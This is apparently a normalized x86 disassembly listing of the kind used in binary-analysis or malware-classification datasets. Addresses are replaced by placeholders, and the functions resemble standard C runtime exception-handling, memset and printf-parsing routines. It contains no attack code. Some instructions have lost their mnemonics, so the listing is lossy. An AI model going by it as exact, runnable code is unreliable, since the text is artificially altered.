push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_4204f2
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_4204f2
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41c0d0
push ebx
push esi
call sub_4204f2
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4204f2
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4204f2
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_4204f2
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_4204f2
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_4204f2
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_414a50
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_4204f2
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_41b63e
pop ecx
pop ecx
push eax
push esi
call sub_414a50
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_416039
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_41b63e
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_41ba46
push 0x8
push r--data
call sub_415ff4
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_41b63e
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_41580c
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_41b8c7
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416039
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_41b63e
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_41580c
jmp r-xdata
sub_41bad8
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_41ba46
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_4157da
call sub_415813
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_41b4c3
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_41b72b
add esp 0x28
test eax eax
je r-xdata
sub_41bb46
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_41a075
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_41a075
lea edi [ eax + 0x80 ]
call sub_419de3
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_415a46
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_41c0d0
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4158d0
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_41bad8
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_41bc3a
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_41c0d0
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_41a075
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_41c0d0
call sub_41c084
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41bb46
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_41a075
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_41a075
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_41a075
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_4204f2
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_415a46
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_41c0d0
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_41b5e9
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_41a075
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_41a075
mov edi [ eax + 0x94 ]
call sub_41a075
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_41b667
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_41b667
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_414f0e
test al al
jne r-xdata
call sub_41c0d0
cmp eax 0x19930522
jne r-xdata
call sub_41a075
call sub_41a075
call sub_41a075
mov [ eax + 0x88 ] esi
call sub_41a075
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_41b41b
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_41b5e9
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_41b3cb
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_415cca
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_41bad8
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_415813
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_41b4c3
add esp 0x10
push [ esi + 0x1c ]
call sub_41b6e2
sub_41bf9e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_41a075
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_41bc3a
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_41b4c3
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c0d0
push 0x8
push r--data
call sub_415ff4
push [ rw-data ]
call sub_419dec
pop ecx
test eax eax
je r-xdata
call sub_41c084
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_41c120
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_420610
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_420610
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_41c16c
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_41eb38
test eax eax
je r-xdata
push 0xa
call sub_419b4e
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_41eb45
pop ecx
push 0x3
call sub_418519
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_415f60
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_41c283
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_41c2b3
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41c30a
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_41c30a
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_41c2b3
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_41c39c
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_41c42c
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_420619
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_420638
jmp r-xdata
sub_41c42c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_414a33
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_41c39c
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_41c48e
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_41c4be
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c4ef
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_4212e9
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_4162ac
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_4162ac
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_421134
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_420fab
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_4210d0
pop ecx
test eax eax
jne r-xdata
call sub_421134
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_420fab
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_421087
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_42075f
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_41c653
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_41a075
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_41fd2e
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_41ffca
mov [ esi + 0x4 ] eax
sub_41c6da
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_42131b
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_41c709
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
push [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
dec [ ebp + 0xc ]
call sub_41c6da
cmp [ esi ] 0xffffffff
pop ecx
je r-xdata
pop esi
pop ebp
retn
sub_41c730
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
xor edi edi
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x448 ] edi
mov [ ebp - 0x408 ] edi
mov [ ebp - 0x42c ] edi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] edi
mov [ ebp - 0x43c ] edi
mov [ ebp - 0x428 ] edi
call sub_41c653
cmp [ ebp - 0x430 ] edi
jne r-xdata
cmp esi edi
je r-xdata
call sub_4162ac
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
movzx edx [ esi ]
xor ecx ecx
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x414 ] edi
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x418 ] edx
cmp dx di
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop edi
add esi edi
cmp [ ebp - 0x420 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
mov eax [ ebp - 0x420 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax dx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x418 ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_41d2a8 ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x45c ] eax
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x45c ]
mov ebx [ ebp - 0x41c ]
mov edx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x43c ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x428 ] eax
jmp r-xdata
movzx eax dx
sub eax 0x20
je r-xdata
cmp dx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp dx 0x2a
jne r-xdata
movzx eax dx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x430 ]
push edx
lea esi [ ebp - 0x420 ]
mov [ ebp - 0x428 ] 0x1
call sub_41c6da
jmp r-xdata
movzx eax dx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] edi
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x42c ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x42c ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x42c ] ebx
test ebx ebx
jge r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x40c ] ebx
test ebx ebx
jge r-xdata
movzx eax [ esi ]
cmp ax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x42c ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp ax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax edi
je r-xdata
cmp ax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov edi [ ebp - 0x40c ]
cmp edi 0xffffffff
jne r-xdata
sub eax edi
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test [ ebp - 0x408 ] 0x1000
jne r-xdata
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
add ebx 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp ax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi edi
